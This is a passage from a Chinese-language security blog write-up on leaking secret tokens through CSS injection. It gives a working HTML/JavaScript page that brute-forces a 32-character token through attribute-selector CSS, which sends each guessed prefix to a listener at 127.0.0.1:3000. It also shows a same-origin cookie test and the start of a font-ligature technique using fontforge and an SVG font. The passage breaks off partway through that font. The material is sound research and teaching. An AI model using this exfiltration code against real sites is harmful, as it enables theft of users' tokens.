class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/cookie.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">        (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line">                clearTokenCookie();</span><br><span class="line">                createIframeWithCss();</span><br><span class="line"><span class="hljs-javascript">                extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">                        if (token) {</span><br><span class="line">                            clearInterval(interval);</span><br><span class="line">                            resolve(token);</span><br><span class="line">                        }</span><br><span class="line">                    }, 50);</span><br><span class="line">                });</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">                Cookies.remove(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateCSS</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> css = <span class="hljs-string">''</span>;</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> ALPHABET) {</span></span><br><span class="line"><span class="hljs-javascript">                    css += <span class="hljs-string">`input[value^="<span class="hljs-subst">${extractedToken}</span><span class="hljs-subst">${char}</span>"] {</span></span></span><br><span class="line"><span class="hljs-actionscript">                            background: url(http:<span class="hljs-comment">//127.0.0.1:3000/token/${extractedToken}${char})</span></span></span><br><span class="line">                        }`;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">return</span> css;</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createIframeWithCss</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://127.0.0.1/css.php?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(generateCSS());</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        })();</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>效果如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122947.png" alt=""></p><h3 id="Token1-Same-Origin"><a href="#Token1-Same-Origin" class="headerlink" title="Token1 - Same Origin"></a>Token1 - Same Origin</h3><p>这个过程需要理解的就是在字符注入爆破成功时设置的 cookie ，它需要我们用 iframe src 同源的域名才能拿到这个 cookie ，否则会受到同源策略的限制拿不到，我们可以做一个简单的测试：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/token/7"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/cookie.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-built_in">Array</span>.from(<span class="hljs-string">"0123456789abcdef"</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line">    clearTokenCookie();</span><br><span class="line"><span class="hljs-javascript">    extractedToken = <span class="hljs-keyword">await</span> getTokenFromCookie();</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>).textContent = extractedToken;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTokenFromCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">          <span class="hljs-keyword">const</span> token = Cookies.get(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">          if (token) {</span><br><span class="line">            clearInterval(interval);</span><br><span class="line">            resolve(token);</span><br><span class="line">          }</span><br><span class="line">        }, 50);</span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearTokenCookie</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-actionscript">      Cookies.remove(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">    }</span><br><span class="line">  })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1:3000/token/78"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122446.png" alt=""></p><p>这里<code>zedd.vv</code>映射到了 127.0.0.1 ，可以看到因为不同源，<code>zedd.vv</code>是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在<code>Path=/</code>，所以我们能在父页面也能拿到 iframe 当中的 cookie</p><h3 id="Token2-Font"><a href="#Token2-Font" class="headerlink" title="Token2 - Font"></a>Token2 - Font</h3><p>现在我们来尝试去获取 javascript 代码中的 token2，在开始之前我们先了解一下什么叫做连字：</p><ul><li><a href="http://www.mzh.ren/ligature-intro.html" target="_blank" rel="noopener">连字简述</a></li><li><a href="https://webzhao.me/ligatures.html" target="_blank" rel="noopener">连字那些事</a></li></ul><p>简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是”fi”序列。在下面的图片中，我们可以很清晰地看到”f”与”i”；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母”f”的顶部连接到”i”上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png" alt=""></p><p>我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/fontforge</span></span><br><span class="line">Open(<span class="hljs-variable">$1</span>)</span><br><span class="line">Generate(<span class="hljs-variable">$1</span>:r + <span class="hljs-string">".woff"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以用<code>fontforge script.fontforge &lt;plik&gt;.svg</code>这个命令来生成 woff 文件，下面这段 svg 代码定义了一种名叫 hack 的字体，包括 a-z 26 个0宽度的字母，以及 sekurak 这个宽度为8000的连字。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hack"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">font-face</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"hack"</span> <span class="hljs-attr">units-per-em</span>=<span class="hljs-string">"1000"</span> /&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">missing-glyph</span> /&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"a"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"b"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"c"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"d"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span 